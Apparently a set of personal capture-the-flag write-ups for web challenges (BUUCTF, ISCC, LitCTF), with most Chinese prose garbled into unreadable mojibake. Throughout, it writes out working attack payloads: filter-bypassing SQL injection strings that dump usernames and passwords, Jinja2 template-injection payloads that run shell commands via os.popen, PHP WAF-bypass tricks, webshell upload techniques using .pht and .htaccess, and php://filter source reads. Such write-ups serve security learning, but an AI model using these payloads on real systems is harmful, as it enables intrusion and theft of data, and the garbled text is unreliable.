## 201.[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife

![image-20250502231921472](201-240.assets/image-20250502231921472.png)

![image-20250502232841693](201-240.assets/image-20250502232841693.png)

å°è¯•ç›´æ¥ç”¨èšå‰‘![image-20250502234504497](201-240.assets/image-20250502234504497.png)

![image-20250502235323094](201-240.assets/image-20250502235323094.png)

Syc=system('cat /flag');ä¹Ÿå¯ä»¥

## 202.[ACTF2020 æ–°ç”Ÿèµ›]Upload

ç®€å•çš„å›¾ç‰‡ä¸Šä¼ 

## 203.[ACTF2020 æ–°ç”Ÿèµ›]BackupFile

Try to find out source file!æŸ¥æ‰¾æºä»£ç  åƒæ˜¯gitæ³„éœ² æ‰«æä¸€ä¸‹

```shell
python3 dirsearch.py -e php -u http://43fc8a22-9124-42d2-9d95-e6a089e8c908.node5.buuoj.cn:81 --exclude-status 403,401
```

![image-20250503173112856](201-240.assets/image-20250503173112856.png)

![image-20250503173208745](201-240.assets/image-20250503173208745.png)

æ„é€ key=123å³å¯

## 204.[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL

python sqlmap.py -r C:\Users\lin\Desktop\1.txt -p username --batch --dbs

æ‰¾åˆ°è¿‡æ»¤è¯è¯­![image-20250503180518948](201-240.assets/image-20250503180518948.png)

uunionnionå‘ç°å¯ä»¥ç»•è¿‡ åˆ™æ˜¯é»‘åå•å»é™¤![image-20250503180700645](201-240.assets/image-20250503180700645.png)![image-20250503180708480](201-240.assets/image-20250503180708480.png)

union select 1,2,3![image-20250503180905857](201-240.assets/image-20250503180905857.png)

![image-20250503180938082](201-240.assets/image-20250503180938082.png)

åé¢å°±å¸¸è§„æ“ä½œ

![image-20250503181542979](201-240.assets/image-20250503181542979.png)

æœ€åæŠ¥å­—æ®µ?username=admin&password=admin' uunionnion sselectelect 1,2,group_concat(passwoorrd)ffromrom b4bsql;#



## 205.[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP

![image-20250503182731842](201-240.assets/image-20250503182731842.png)

æŒ‰æç¤º æ‰«ç›˜åæ‰¾åˆ°æºç  å‘åºåˆ—åŒ–



## 206.[RoarCTF 2019]Easy Calc

![image-20250503224939246](201-240.assets/image-20250503224939246.png)

![image-20250503225709515](201-240.assets/image-20250503225709515.png)

![image-20250505123001837](201-240.assets/image-20250505123001837.png)

### PHP å­—ç¬¦ä¸²è§£æç‰¹æ€§ï¼š

åˆ é™¤ç©ºç™½å­—ç¬¦ï¼š

PHP åœ¨è§£æ URL æŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ä¼šåˆ é™¤ç©ºæ ¼ç­‰ç©ºç™½å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œåœ¨ GET è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­ï¼Œ%20ï¼ˆè¡¨ç¤ºç©ºæ ¼ï¼‰ä¼šè¢«è‡ªåŠ¨è½¬æ¢æˆä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼Œä¸”æœ€ç»ˆä¼šä»æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­åˆ é™¤ã€‚

è½¬æ¢ç‰¹æ®Šå­—ç¬¦ä¸ºä¸‹åˆ’çº¿ï¼š

PHP ä¼šå°†æŸäº›ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚æ–¹æ‹¬å· []ï¼‰è½¬ä¸ºä¸‹åˆ’çº¿ã€‚ä¾‹å¦‚ï¼Œnews[id] ä¼šè¢«è§£æä¸º news_idï¼Œå› æ­¤ $_GET["news[id"] ä¼šå˜æˆ $_GET["news_id"]ã€‚

### ï¼ˆWAFç»•è¿‡ï¼‰ï¼š

1. PHP åˆ é™¤ç©ºæ ¼ï¼š

   å½“æˆ‘ä»¬å‘æŸ¥è¯¢å­—ç¬¦ä¸²æ·»åŠ  %20ï¼ˆå³ç©ºæ ¼ï¼‰ï¼ŒPHP ä¼šåœ¨è§£ææ—¶å°†å…¶ åˆ é™¤ã€‚ä¾‹å¦‚ï¼Œ/? %20num=abc ä¼šè¢«è§£æä¸º /?num=abcï¼Œè€Œ WAF çœ‹åˆ°çš„æ˜¯æ²¡æœ‰ç©ºæ ¼çš„ num=abcï¼Œå› æ­¤ WAF æ— æ³•æ£€æµ‹åˆ° num å‚æ•°ä¸­çš„å­—æ¯ã€‚

2. WAF çš„æ£€æŸ¥ç‚¹ï¼š

   WAF æ˜¯åœ¨ URL ä¼ å…¥æ—¶å¯¹å‚æ•°è¿›è¡Œæ£€æŸ¥çš„ï¼Œå®ƒä¼šçœ‹åˆ°å¸¦æœ‰ç©ºæ ¼çš„æŸ¥è¯¢å­—ç¬¦ä¸²å¹¶è®¤ä¸º num å‚æ•°æ ¹æœ¬ä¸å­˜åœ¨ï¼Œä»è€Œæ²¡æœ‰è¿›è¡Œå­—æ¯æ£€æŸ¥ã€‚PHP å¤„ç†å®Œç©ºæ ¼åï¼Œnum å‚æ•°å°±æ¢å¤ä¸ºæ­£å¸¸çš„æ ¼å¼ num=abcï¼ŒWAF å› ä¸ºç©ºæ ¼è¢«è¯¯å¯¼ï¼Œæœªèƒ½æ£€æµ‹åˆ°é—®é¢˜ã€‚

? num=var_dump(scandir(chr(47)))

![image-20250505123200430](201-240.assets/image-20250505123200430.png)

æœ€åæŸ¥çœ‹flagæ–‡ä»¶ï¼š

/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))

![image-20250506103333384](201-240.assets/image-20250506103333384.png)



## 207.[FSCTF 2023]æ˜¯å…„å¼Ÿï¼Œå°±æ¥ä¼ ä½ ã®ğŸï¼

ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬è¢«é˜»æ­¢![image-20250506104255949](201-240.assets/image-20250506104255949.png)

ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶å¤´muma![image-20250506104348960](201-240.assets/image-20250506104348960.png)

æ–‡ä»¶ååç¼€æ”¹ä¸ºphtï¼Œæ”¹æ–‡ä»¶ååç¼€æ˜¯å› ä¸ºå·²ç»ä¸Šä¼ ä¸äº†æœ¨é©¬åªèƒ½å°è¯•ç”¨å…¶ä»–çš„

![image-20250506114802093](201-240.assets/image-20250506114802093.png)

<?= æ˜¯phpä¸­çš„çŸ­æ ‡ç­¾ç›¸å½“äº<?php echo

nlç±»ä¼¼äºcat,  `nl /*`çš„æ„æ€æ˜¯æŠŠæ‰€æœ‰æ–‡ä»¶éƒ½æ‰“å°å‡ºæ¥

![image-20250506115208722](201-240.assets/image-20250506115208722.png)

å†è®¿é—®æ–‡ä»¶![image-20250506115644930](201-240.assets/image-20250506115644930.png)



## 208.[LitCTF 2023]Follow me and hack me

![image-20250506122827541](201-240.assets/image-20250506122827541.png)

ä¼ å‚

æ‰«ç›˜æœ‰å½©è›‹

## 209.[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag

ä»æºç æ‰¾åˆ°å…³é”®ç½‘ç«™![image-20250506151632089](201-240.assets/image-20250506151632089.png)

![image-20250506151645400](201-240.assets/image-20250506151645400.png)

![image-20250506151744700](201-240.assets/image-20250506151744700.png)

ä¼ å‚æ²¡ååº”![image-20250506152519733](201-240.assets/image-20250506152519733.png)

å†çœ‹æç¤ºè¯´å¿…é¡»æ˜¯quitå­¦ç”Ÿ æ³¨æ„åˆ°cookie å°†0ä¿®æ”¹ä¸º1ï¼Œæ”¾è¡Œåæç¤ºå¤ªé•¿![image-20250506152631921](201-240.assets/image-20250506152631921.png)

ç”¨e  2e9

## 210.[HCTF 2018]admin

çœ‹é¢˜ç›®ç›´æ¥ç™»å½• è´¦å·admin å¯†ç 123ç›´æ¥æˆåŠŸäº†

## 211.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢

ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶æŠ¥é”™ï¼Œæ”¹åç¼€ä¹Ÿæ— æ³•ç»•è¿‡![image-20250506154528596](201-240.assets/image-20250506154528596.png)

ç»è¿‡åå¤ä¸Šä¼  åˆæ­¥æ–­å®šè¦MIMEç»•è¿‡ å†åŠ ä¸Šhtaccessé…ç½®æ–‡ä»¶ç»•è¿‡

![image-20250506155752772](201-240.assets/image-20250506155752772.png)

å†ä¸Šä¼ å›¾ç‰‡ç ![image-20250506155827897](201-240.assets/image-20250506155827897.png)



## 212.[æŠ¤ç½‘æ¯ 2018]easy_tornado

æ‰“å¼€ç½‘å€![image-20250506160915045](201-240.assets/image-20250506160915045.png)![image-20250506161217510](201-240.assets/image-20250506161217510.png)

![image-20250506161140447](201-240.assets/image-20250506161140447.png)![image-20250506160924874](201-240.assets/image-20250506160924874.png)

æŠ“åŒ…æŸ¥çœ‹ä¼ å‚å½¢å¼![image-20250506161404266](201-240.assets/image-20250506161404266.png)

urlç”±filenameå’Œfilehashæ„æˆ å½“åªæœ‰å‰è€…æ—¶æŠ¥é”™![image-20250506165303935](201-240.assets/image-20250506165303935.png)

å°è¯•æ³¨å…¥error?msg={{handler.settings}}![image-20250506165622376](201-240.assets/image-20250506165622376.png)

æ„é€ **/file?filename=/fllllllllllllag&filehash=md5(cookie_secret+md5(/fllllllllllllag))**

![image-20250506165956064](201-240.assets/image-20250506165956064.png)



## 213.[Flask]SSTI

https://github.com/vulhub/vulhub/blob/master/flask/ssti/README.zh-cn.md

å…ˆçœ‹ä»–çš„é¡¹ç›®é“¾æ¥![image-20250506191629459](201-240.assets/image-20250506191629459.png)

![image-20250506191033478](201-240.assets/image-20250506191033478.png)![image-20250506191100175](201-240.assets/image-20250506191100175.png)

{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}

![image-20250506191952807](201-240.assets/image-20250506191952807.png)





## 214.[ç¬¬ä¸‰ç«  webè¿›é˜¶]SSTI

![image-20250506195613883](201-240.assets/image-20250506195613883.png)

![image-20250506192708011](201-240.assets/image-20250506192708011.png)å‡çš„

å‡çš„flag

lsåæŸ¥çœ‹å…¶ä»–æ–‡ä»¶![image-20250506193032893](201-240.assets/image-20250506193032893.png)





## 215.[ZJCTF 2019]NiZhuanSiWei

![image-20250506201430866](201-240.assets/image-20250506201430866.png)

data://åè®®ç»•è¿‡ç¬¬ä¸€ä¸ª![image-20250506203548140](201-240.assets/image-20250506203548140.png)

åé¢è¦ååºåˆ—åŒ– ä½†æ²¡æœ‰ä»»ä½•ä¿¡æ¯ ä¹Ÿä¸èƒ½ç›´æ¥fileè¯»å–flag æ‰€ä»¥å…ˆçœ‹useless.php

php://filter/read=convert.base64-encode/resource=useless.php

![image-20250506204226823](201-240.assets/image-20250506204226823.png)

è¯»å®Œå fileèµ‹å€¼ä¸ºuseless.phpä½¿å…¶è¢«includeåŒ…å«

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

æœ€ååºåˆ—åŒ–![image-20250507134112578](201-240.assets/image-20250507134112578.png)

æœ€åurl![image-20250507134143993](201-240.assets/image-20250507134143993.png)



## 216.[MRCTF2020]Ez_bypass

![image-20250507135456215](201-240.assets/image-20250507135456215.png)

![image-20250507135755914](201-240.assets/image-20250507135755914.png)



## 217.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL

sqlmapæ³¨å…¥ä¸äº† æ‰‹åŠ¨æ³¨å…¥

æ‰¾å‡ºè¢«è¿‡æ»¤çš„å­—ç¬¦![image-20250507142353697](201-240.assets/image-20250507142353697.png)

1' oorr 1=1;#ä¹Ÿè¢«è¿‡æ»¤ è¯´æ˜ä¸æ˜¯é»‘åå•æ¶ˆé™¤ ç©ºæ ¼å’Œç­‰å·éƒ½è¢«è¿‡æ»¤äº†![image-20250507215834871](201-240.assets/image-20250507215834871.png)

ç”¨likeä»£æ›¿ç­‰å·ï¼Œæ‹¬å·ä»£æ›¿ç©ºæ ¼

![image-20250507215821525](201-240.assets/image-20250507215821525.png)

æŠ¥é”™æ³¨å…¥

çˆ†åº“

1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#![image-20250507220236257](201-240.assets/image-20250507220236257.png)

çˆ†è¡¨

1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#![image-20250507220629790](201-240.assets/image-20250507220629790.png)

1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#![image-20250507221122167](201-240.assets/image-20250507221122167.png)

1'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))#

![image-20250507221241944](201-240.assets/image-20250507221241944.png)

1'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#![image-20250507221354705](201-240.assets/image-20250507221354705.png)



## 218.èµ›åšä¹‹åŸ  [ISCC]

![image-20250513150256943](201-240.assets/image-20250513150256943.png)

![image-20250513150305095](201-240.assets/image-20250513150305095.png)

æƒ³èµ·é¢˜ç›®æç¤ºâ€œç”¨æˆ·ä»£ç†â€å’Œå›å½’åŸºç¡€ï¼Œäºæ˜¯åœ¨user-agentå¡«æ•°æ®å†æäº¤![image-20250514212544069](201-240.assets/image-20250514212544069.png)

æŸ¥çœ‹æ–‡ä»¶![image-20250514212551069](201-240.assets/image-20250514212551069.png)

![image-20250514232221310](201-240.assets/image-20250514232221310.png)

a=               æ•°å­—

b=      1 = e559dcee72d03a13110efe9b6355b30d    å­—æ¯ï¼Œé0å¼€å¤´

$c=   jibengong                

$ jibengong=$a=    1 

è¿™é‡Œæœ‰ä¸ªâ¾®æ³•å‚æ•°åä¼ å‚è€ƒå¯Ÿï¼Œå°†ç¬¬â¼€ä¸ª**_æ›¿æ¢ä¸º[**

æ„é€ intval($b) == 'jibengong'ï¼š$bä»¥éæ•°å­—å¼€å¤´ï¼ˆå¦‚a0ï¼‰ï¼Œå…¶intvalä¸º0ã€‚
ç»•è¿‡strposæ£€æŸ¥ï¼šç¡®ä¿$bä¸­çš„0ä¸åœ¨é¦–ä½ï¼ˆå¦‚a0ï¼‰ã€‚
å˜é‡è¦†ç›–ä¸MD5åŒ¹é…ï¼šé€šè¿‡$$c = $aè®¾ç½®$jibengongä¸º$açš„å€¼ï¼Œå¹¶æ„é€ parse_strå‚æ•°ä½¿$huiguiflag[$a]ç­‰äºmd5($c)
å¯¹äºå‚æ•°ä¸‰è¦huigui_jibengong.3è¿›â¾md5åç­‰äºhuigui_jibengong.2ï¼Œå°†jibengongè¿›è¡Œmd5åŠ å¯†ï¼šä¸ºe559dcee72d03a13110efe9b6355b30d

```url
huigui[jibengong.1=123&huigui[jibengong.2=a0%3D123%26123%3De559dcee72d03a13110efe9b6355b30d&huigui[jibengong.3=jibengong
```



## 219.å“ªå’çš„è¯•ç‚¼ [ISCC2025]

![image-20250513155116813](201-240.assets/image-20250513155116813.png)

![image-20250513155135258](201-240.assets/image-20250513155135258.png)

çº¿ç´¢ä¸€å®šæ˜¯è²è—• æœ€åæ„é€ payload![image-20250513155206410](201-240.assets/image-20250513155206410.png)

æŒ‰é’®æœ€å¼€å§‹æŒ‰ä¸äº†ï¼ŒæŠŠdiså»æ‰å![image-20250513155342703](201-240.assets/image-20250513155342703.png)

å»åˆ°getä¼ å‚ åŠ ä¸Špostä¼ å‚

![image-20250513160522924](201-240.assets/image-20250513160522924.png)

![image-20250513161704542](201-240.assets/image-20250513161704542.png)

ç›´æ¥æäº¤å°±é”™è¯¯äº† ä¸€å®šæ˜¯è¦å’Œä¸Šé¢çš„æ–‡å­—ç»“åˆ![image-20250513224258087](201-240.assets/image-20250513224258087.png)

æŒ‰è§„å¾‹ç¿»è¯‘ è·å¾—flag



## 220.shallowseek[ISCC2025]

![image-20250513172334124](201-240.assets/image-20250513172334124.png)

![image-20250513172646624](201-240.assets/image-20250513172646624.png)

è¿™æ˜¯å‡flagï¼Œäºæ˜¯è”ç½‘æŸ¥çœ‹f1@g.txt![image-20250513172808391](201-240.assets/image-20250513172808391.png)

å°è¯•æ³¨å…¥ ä¹Ÿè¢«è¿‡æ»¤![image-20250513173206461](201-240.assets/image-20250513173206461.png)![image-20250513173827563](201-240.assets/image-20250513173827563.png)

å•ç‹¬è¾“å…¥orå‘ç°ä¸€æ ·çš„æç¤º é‚£ä¹ˆå°±æ˜¯orè¢«è¿‡æ»¤äº†

ä¸ç¡®å®šæ˜¯ä¸æ˜¯æ³¨å…¥é¢˜ï¼Œåœ¨é¡µé¢ä¸­æ‰¾å¯»åˆ°å¦‚ä¸‹js ï¼šhttp://112.126.73.173:49111/static/evil-buttons.js

```javascript
document.addEventListener('DOMContentLoaded', function () {
    const btnA = document.getElementById('btn-a');
    const btnB = document.getElementById('btn-b');
    let aLocked = false;
    let bLocked = false;
    const _ = [0x6c, 0x6f, 0x63, 0x6b];

    // é’æ¿†îç€¹æ°«ç¶…
    btnA.style.position = 'absolute';
    btnB.style.position = 'absolute';
    btnA.style.left = '60%';
    btnA.style.top = '100px';
    btnB.style.left = '70%';
    btnB.style.top = '100px';
    
    function resetPosition(btn, left, top) {
        btn.style.left = left;
        btn.style.top = top;
    }
    
    window[String.fromCharCode(0x6c,0x6f,0x63,0x6b) + String.fromCharCode(0x41)] = function (k, v) {
        if (btoa(k + String.fromCharCode(0x38) + v) === 'NDM4Mg==') {
            aLocked = true;
            btnA.classList.add('locked');
            resetPosition(btnA, '60%', '100px');
            console.log("Aé¸å¤æŒ³å®¸æŸ¥æ”£ç€¹æ°¾ç´’");
            fetch('api/mark_frag_ok.php');
        }
    };
    
    window.lockB = function () {
        bLocked = true;
        btnB.classList.add('locked');
        resetPosition(btnB, '70%', '100px');
        console.log("Bé¸å¤æŒ³å®¸æŸ¥æ”£ç€¹æ°¾ç´’");
    };
    
    btnA.addEventListener('mouseenter', function () {
        if (!aLocked) {
            const offsetX = Math.random() * 200 - 100;
            const offsetY = Math.random() * 100 - 50;
            btnA.style.left = `calc(60% + ${offsetX}px)`;
            btnA.style.top = `calc(100px + ${offsetY}px)`;
        }
    });
    
    btnB.addEventListener('mouseenter', function () {
        if (!bLocked) {
            const offsetX = Math.random() * 200 - 100;
            const offsetY = Math.random() * 100 - 50;
            btnB.style.left = `calc(70% + ${offsetX}px)`;
            btnB.style.top = `calc(100px + ${offsetY}px)`;
        }
    });
    
    btnA.addEventListener('click', function () {
        if (!aLocked) {
            alert('æ¶“è½°ç²ˆæ¶”å œç¬‰ç’‡æ›¡ç˜¯é–«å¡€é”›ï¿½');
        } else {
            fetch('api/get_frag.php')
                .then(res => res.text())
                .then(data => alert(data))
                .catch(() => alert("ç’‡è¯²å½‡æ¾¶è¾«è§¦"));
        }
    });
    
    btnB.addEventListener('click', function () {
        if (!bLocked) {
            fetch('api/hint.php')
                .then(r => r.text())
                .then(txt => alert(txt));
        } else {
            alert('ç¼æ¬ç¶˜ç’è¹­é‡œç»—æˆ£ç˜½é”›æ°¬î†æµœå“„æ†¡ç’‡å¤Œâ–¼æ´å¿“æ†³é”›æ°¬å¹“æ¶”é¢è¢±æ¶“î…î”™ç€›æ„¶ç´æ¿¡å‚›ç‰éˆå¤ã‚¿é¡æ»ç´çå˜æ‹±æ¶“â‚¬æ¶“îç´æµœåº¢æ§¸æµ æ ¨æ¸¶éšåºæ‹±é¥ç‚´æ½µæ¶“â‚¬æ¶“î…î”™ç€›æ„©â‚¬ï¿½');
        }
    });

});
```

è®¿é—®ï¼šapi/hint.php ShallowSeekçš„å¥½æœ‹å‹AJAXå¥½æƒ³è¦ä¸ªå¤´å•Šï¼ŒXå¼€å¤´çš„æœ€å¥½äº†

ç”±AJAXè”æƒ³åˆ°ï¼š **X-Requested-With: XMLHttpRequest **

å¯¹äºapi/mark_frag_ok.php ä½ ä¸ºä»€ä¹ˆä¸è¯•è¯•æ‰ä½çˆ±åŠ¨çš„Bé€‰é¡¹ï¼Ÿ

api/get_frag.php ShallowSeekè™½ç„¶å‚»ï¼Œä½†æ˜¯ä¸æƒ³è®©ä½ çœ‹è¿™ä¸ª

å½“æˆ‘ä»¬å¸¦ç€api/mark_frag_ok.phpä¸­çš„cookieå’ŒX-Requested-Withè®¿é—®

```python
import requests

s = requests.Session()  # è‡ªåŠ¨ç®¡ç† Cookie
headers = {
    "X-Requested-With": "XMLHttpRequest",  # æ ‡è¯† AJAX è¯·æ±‚
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
}

base_url = "http://112.126.73.173:49111/api"
mark_url = f"{base_url}/mark_frag_ok.php"
res_mark = s.get(mark_url, headers=headers)


print("è·å–çš„ Cookie:", s.cookies.get_dict())

# 2. å¸¦ç€ Cookie å’Œ X-Requested-With è®¿é—® get_frag.php

get_url = f"{base_url}/get_frag.php"
res_get = s.get(get_url, headers=headers)

print("HTTP çŠ¶æ€ç :", res_get.status_code)
print("è·å–çš„ Cookie:", s.cookies.get_dict())
print("å“åº”å†…å®¹:", res_get.text)

```

è·å–çš„ Cookie: {'PHPSESSID': 'ab521e0578588efa2cabacada1e2ab27'}
HTTP çŠ¶æ€ç : 200
è·å–çš„ Cookie: {'PHPSESSID': 'ab521e0578588efa2cabacada1e2ab27'}
å“åº”å†…å®¹: ISCC{0p3n

æ‹¼æ¥åå‘ç° ISCC{0p3n01_cu_5_3r35_th3b5t!}æäº¤ä¸å¯¹ã€‚æœ€åå‘ç°æ˜¯flagååŠæ®µæœ‰é—®é¢˜

å¤åˆ¶å¦‚ä½•ç»™ISCCå‡ºé¢˜é‡Œé¢çš„è¯ï¼Œå»é—®

![image-20250604154233435](201-240.assets/image-20250604154233435.png)

ç›´æ¥ä¸¢ç»™AIï¼Œç„¶åç»™æˆ‘ä»¬ä¸€ä¸ªè„šæœ¬

ç„¶ååœ¨æ»•ç‹é˜åºä¸­å‘ç°å¯†é’¥ï¼š387531189

```python
def shallow_seek_decrypt(encrypted_text, key):
    """
    Decrypts the given text using the ShallowSeek algorithm with the provided key.

    Args:
        encrypted_text (str): The encrypted text to be decrypted.
        key (str): The decryption key (digits only).
    
    Returns:
        str: The decrypted original text.
    """
    if not encrypted_text or not key:
        return encrypted_text
    
    # Convert key digits to integers
    key_digits = [int(c) for c in key if c.isdigit()]
    
    # Split the encrypted text into parts:
    # 1. Parts selected by the key (same length as key)
    # 2. Remaining parts (if any)
    key_selected = list(encrypted_text[:len(key_digits)])
    remaining = list(encrypted_text[len(key_digits):])
    
    original_parts = []
    
    # We need to process the key in reverse order
    for digit in reversed(key_digits):
        if not key_selected:
            break
    
        # The last character in key_selected was inserted at position (digit-1)
        # So we need to insert it back at that position in the current text
        char = key_selected.pop()
    
        # If remaining is not empty, we need to consider it as part of the text
        # where the character was inserted
        insert_pos = digit - 1
        if insert_pos > len(remaining):
            remaining.append(char)
        else:
            remaining.insert(insert_pos, char)
    
    # The remaining parts now contain the original text
    return ''.join(remaining)


# Example usage

encrypted_text = "01_cu_5_3r35_th3b5t!}"
decryption_key = "387531189"

decrypted_text = shallow_seek_decrypt(encrypted_text, decryption_key)
print(f"Encrypted: {'ISCC{0p3n'+encrypted_text}")
print(f"Decrypted: {'ISCC{0p3n'+decrypted_text}")

```

Encrypted: ISCC{0p3n01_cu_5_3r35_th3b5t!}
Decrypted: ISCC{0p3n_50urc3_15_th3_b35t!}

## 221.åå…«é“œäººé˜µ[ISCC2025]

![image-20250513230516450](201-240.assets/image-20250513230516450.png)

![image-20250513230628181](201-240.assets/image-20250513230628181.png)

å…ˆæŸ¥çœ‹æºç  å‘ç°èµ¢è—å­—æ®µ 

![image-20250513230702243](201-240.assets/image-20250513230702243.png)

è¿˜æœ‰ä¸€æ®µ![image-20250513231108487](201-240.assets/image-20250513231108487.png)

çœ‹çœ‹/iewnaibgnehsgnitï¼ˆ/iewnaibgnehsgnit -> /tinginghsgenbianweiï¼‰åˆ¤æ–­å°±æ˜¯flagçš„æ–‡ä»¶![image-20250513231126302](201-240.assets/image-20250513231126302.png)

ä»”ç»†çœ‹æºä»£ç å¯ä»¥çœ‹åˆ°æœ‰å…«ä¸ªâ€œä½›æ›°â€å¼€å¤´çš„æ³¨é‡Šï¼Œäºæ˜¯è”æƒ³åˆ°ä½›æ›°è§£å¯†
å°†æ¯ä¸ªæ³¨é‡Šæ”¾åˆ°ä½›æ›°åœ¨çº¿è§£å¯†å·¥å…·ä¸­è§£å¯†

```
å¬å£°è¾¨ä½
è¥¿å—æ–¹
ä¸œå—æ–¹
åŒ—æ–¹
è¥¿æ–¹
ä¸œåŒ—æ–¹
ä¸œæ–¹
æ¢æœ¬ç©·æº
```

æŠ“åŒ…æ³¨å…¥ï¼Œè¿›å…¥ä¸‹ä¸€å…³![image-20250604154521181](201-240.assets/image-20250604154521181.png)

ä½†è®¿é—®ç»™å‡ºçš„æç¤ºæ²¡æœ‰ç”¨ï¼Œçœ‹çœ‹ç½‘å€ï¼šiewnaibgnehsgnit å‘ç°æ˜¯å¬å£°è¾©ä½åç€çš„æ‹¼éŸ³ï¼ŒçŒœæµ‹ä¸‹ä¸€ä¸ªæ˜¯æ¢æœ¬ç©·åŸçš„æ‹¼éŸ³åç€å¿µã€‚

è¿™é‡Œè¦å¸¦ç€sessionè®¿é—®ï¼š

```http
GET /nauygnoiqnebnat HTTP/1.1
Host: 112.126.73.173:16340
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://112.126.73.173:16340/
Connection: close
Cookie: session=eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.aCTPNg.O8Sx8uWdfoAWKx_ACUt7n7fWWYk
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

è¿›å…¥ä¸‹ä¸€å…³ï¼š

![image-20250604154704688](201-240.assets/image-20250604154704688.png)

æŸ¥çœ‹æºç ï¼š![image-20250604154723874](201-240.assets/image-20250604154723874.png)ã€

å¤ç°ï¼šæ˜¯åˆ©ç”¨yongzhengçš„postè¯·æ±‚ï¼Œæµ‹è¯•å¾ˆä¹…åå‘ç°æ˜¯æ— å›æ˜¾sstiæ³¨å…¥

POSTä¼ å‚ï¼š

yongzheng={{lipsum|attr(request.args.a1)|attr(request.args.a2)(request.args.a3)|attr(request.args.a4((request.args.a5))|attr(request.args.a6)()}}![image-20250604154810794](201-240.assets/image-20250604154810794.png)


## 222.æ˜Ÿæ„¿ä¿¡ç®± [Litctf2025]

![image-20250526160301796](201-240.assets/image-20250526160301796.png)

é€šè¿‡è¾“å…¥æµ‹è¯•ï¼Œæ’é™¤äº†SQLæ³¨å…¥ï¼Œä¹Ÿæ‰«ä¸åˆ°æ–‡ä»¶ï¼Œè¯•è¯•sstiæ³¨å…¥ï¼Œä½†è¢«å±è”½

![image-20250528115331319](201-240.assets/image-20250528115331319.png)

![image-20250526162140228](201-240.assets/image-20250526162140228.png)

é‚£å°±å°è¯•ä½¿ç”¨æ§åˆ¶è¯­å¥çš„ç¬¦å·{% %}æ¥æ‰§è¡Œprint()å‡½æ•°ã€‚
{{ }}ï¼šé€šå¸¸ç”¨äºè¾“å‡ºå˜é‡æˆ–è¡¨è¾¾å¼çš„ç»“æœï¼ˆå¦‚ Jinja2ã€Djangoã€Twigï¼‰ã€‚
{% %}ï¼šç”¨äºæ‰§è¡Œæ§åˆ¶é€»è¾‘ï¼ˆå¦‚æ¡ä»¶åˆ¤æ–­ã€å¾ªç¯ã€å®å®šä¹‰ç­‰ï¼‰ã€‚

![image-20250528115458124](201-240.assets/image-20250528115458124.png)

æ›¿ä»£ä¹‹åå°±å¯ä»¥äº†ï¼Œç„¶åä½¿ç”¨self.**dict**._TemplateReference__context.keys()å‘½ä»¤ï¼Œå¤§å®¶å¯ä»¥è®°ä½è¿™æ¡å‘½ä»¤


```python
self._dict_._TemplateReference__context.keys()
```

ç”¨é€”ï¼š
è¯¥å‘½ä»¤ä¸»è¦ç”¨äº æšä¸¾å½“å‰æ¨¡æ¿ä¸Šä¸‹æ–‡ä¸­çš„æ‰€æœ‰å˜é‡ã€‚åœ¨Jinja2ç­‰æ¨¡æ¿å¼•æ“ä¸­ï¼Œselfå¯èƒ½æŒ‡å‘æ¨¡æ¿çš„ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œ_TemplateReference__contextæ˜¯å…¶ï¼ˆé€šè¿‡åç§°æ”¹å†™è®¿é—®å†…éƒ¨çš„ `__context` å±æ€§ã€‚ï¼‰å†…éƒ¨å±æ€§ï¼Œkeys()åˆ™è¿”å›æ‰€æœ‰å¯è®¿é—®çš„å˜é‡åã€‚![image-20250528120033079](201-240.assets/image-20250528120033079.png)

å›æ˜¾å†…ç½®å‡½æ•°ï¼Œ

```python
{%print(lipsum.__globals__.os.popen('ls').read())%}
```

